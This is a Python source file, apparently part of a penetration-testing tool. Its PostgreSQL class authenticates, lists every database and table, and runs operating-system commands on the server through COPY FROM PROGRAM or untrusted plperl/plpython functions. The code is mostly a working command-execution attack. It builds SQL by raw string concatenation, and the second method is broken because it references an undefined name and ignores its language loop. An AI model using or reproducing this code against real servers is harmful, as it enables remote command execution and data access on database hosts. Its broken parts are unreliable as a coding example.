import socket
import traceback
import logging

import psycopg2

from utils.utils import AuthFailure
from utils.utils import gen_random_string

class PostgreSQL:

    def __init__(self, hostname, port, timeout):
        self.hostname = hostname
        self.port = port
        self.timeout = timeout

        self.conn = None
        self.username = None
        self.password = None

    def url(self):
        return 'postgresql://%s:%d' % (self.hostname, self.port)

    def disconnect(self):
        if self.conn != None:
            self.conn.close()
        self.conn = None

    def auth(self, username, password):
        success = False

        self.conn = psycopg2.connect(host=self.hostname, port=self.port, user=username, password=password, connect_timeout=self.timeout, dbname='')

        self.username = username
        self.password = password

        cur = self.conn.cursor()
        cur.execute('SELECT version();')

        version = cur.fetchall()[0][0]

        return True, version

    def list_databases(self):
        databases = []
        c = self.conn.cursor()
        c.execute("SELECT datname FROM pg_database WHERE datistemplate = false;")
        res = c.fetchall()

        for db in res:
            db_info = {'name': db[0]}

            conn_db = psycopg2.connect(host=self.hostname, port=self.port, user=self.username, password=self.password, connect_timeout=self.timeout, dbname=db[0])

            c_db = conn_db.cursor()
            c_db.execute("SELECT table_catalog,table_schema,table_name,table_type FROM information_schema.tables WHERE table_type='BASE TABLE'")
            tables = []
            for table in c_db.fetchall():
                tables.append({'schema': table[1], 'name': table[2]})
            db_info['tables'] = tables

            conn_db.close()

            databases.append(db_info)

        return databases

    def execute_cmd(self, cmd):
        output = self.execute_method1(cmd)

        if not output:
            for lang in ['python', 'perl']:
                output = self.execute_method2(cmd)
                if output:
                    break

        return output

    # Method 1: COPY ... FROM PROGRAM
    def execute_method1(self, command):
        random_string = "audit_" + gen_random_string() # Table name cannot begin with a number
        try:
            c = self.conn.cursor()
            c.execute("CREATE TABLE " + random_string + " (id text);")
            c.execute("COPY " + random_string + " from program '" + command + "';")
            c.execute("SELECT id FROM " + random_string + ";")

            command_result = "\n".join([row[0] for row in c.fetchall()])

        except psycopg2.ProgrammingError as e:
            print("%s: %s" % (type(e), e))
            command_result = None
        except psycopg2.InternalError as e:
            print("%s: %s" % (type(e), e))
            command_result = None
        finally:
            try:
                c = self.conn.cursor()
                c.execute("DROP TABLE " + random_string + ";")
            except:
                pass


        return command_result

    # Method 2: LANGUAGE perl or python
    def execute_method2(self, command, lang='python'):

        try:
            c = self.conn.cursor()
            # add language
            c.execute("CREATE LANGUAGE pl%su" % lang)

            if lang == "perl":
                create_func_sql = """CREATE OR REPLACE FUNCTION %s() RETURNS text AS $BODY$
                    use warnings;
                    use strict;
                    my $output = `%s`;
                    return($output);
                $BODY$ LANGUAGE plperlu;""" % (random_string, command)
            elif lang == "python":
                create_func_sql = """CREATE OR REPLACE FUNCTION %s() RETURNS text AS $BODY$
                    import subprocess, shlex
                    return subprocess.check_output(shlex.split('%s'));
                $BODY$ LANGUAGE plpythonu;""" % (random_string, command)
            else:
                return None

            c.execute(create_func_sql)
            c.execute("SELECT " + random_string + "();")

            command_result = "\n".join([row[0] for row in c.fetchall()])
        except psycopg2.ProgrammingError as e:
            print("%s: %s" % (type(e), e))
            command_result = None
        except psycopg2.InternalError as e:
            print("%s: %s" % (type(e), e))
            command_result = None
        finally:
            pass

        return command_result


